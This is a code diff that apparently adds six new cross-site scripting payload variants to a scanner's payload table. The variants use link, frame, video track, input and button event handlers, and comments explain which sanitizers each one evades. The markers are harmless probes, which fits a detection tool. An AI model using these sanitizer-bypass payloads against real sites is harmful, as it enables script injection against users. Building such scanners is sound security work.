@@ -281,6 +281,52 @@ PAYLOAD_VARIANTS = {
         '"><template shadowrootmode=open><script>1</script></template><dXsS>',
         '<template shadowrootmode=open><script>1</script></template><dXsS>',
     ),
+
+    # Phase 1.2 milestone 4 additions ---------------------------------------
+    # <link rel=stylesheet href=x onerror=1>. Modern browsers fire onerror
+    # on link load failure; many allowlist sanitizers miss link event
+    # handlers because they focus on <script>/<img>/<svg>.
+    "link-onerror-breakout": (
+        '"><link rel=stylesheet href=x onerror=1><dXsS>',
+        '<link rel=stylesheet href=x onerror=1><dXsS>',
+    ),
+    # <frameset><frame onload=1>. Frameset context is rarely modelled by
+    # sanitizers. Works in every mainstream browser that still parses
+    # framesets (which is all of them at this writing).
+    "frame-onload-breakout": (
+        '"><frameset><frame onload=1><dXsS></frameset>',
+        '<frameset><frame onload=1><dXsS></frameset>',
+    ),
+    # <video><track src=x onerror=1>. Complement to video-source: the
+    # track element accepts its own onerror. Different attribute path
+    # from source-onerror-breakout so a stripping-only-<source> sanitizer
+    # still fires this.
+    "track-onerror-breakout": (
+        '"><video><track src=x onerror=1></video><dXsS>',
+        '<video><track src=x onerror=1></video><dXsS>',
+    ),
+    # <input onauxclick=1>. Middle/right-click event. Rarely-audited
+    # handler that fires without a normal click UX.
+    "input-onauxclick-breakout": (
+        '"><input onauxclick=1 value=test><dXsS>',
+        '<input onauxclick=1 value=test><dXsS>',
+    ),
+    # <button formaction=javascript:1 formtarget=_blank>. Distinct from
+    # form-formaction-breakout: formtarget=_blank opens the exploit in
+    # a new tab, defeating iframe-sandbox and some referrer policies.
+    "button-formtarget-breakout": (
+        '"><form><button formaction=javascript:1 formtarget=_blank>'
+        '<dXsS></button></form>',
+        '<button formaction=javascript:1 formtarget=_blank><dXsS>'
+        '</button></form>',
+    ),
+    # <input onfocusin=1 autofocus>. Bubbling focus event; sanitizers
+    # blocking onfocus by name miss onfocusin. Same trigger mechanism
+    # (autofocus attribute) so no user interaction needed.
+    "input-onfocusin-breakout": (
+        '"><input onfocusin=1 autofocus value=x><dXsS>',
+        '<input onfocusin=1 autofocus value=x><dXsS>',
+    ),
 }
 
 
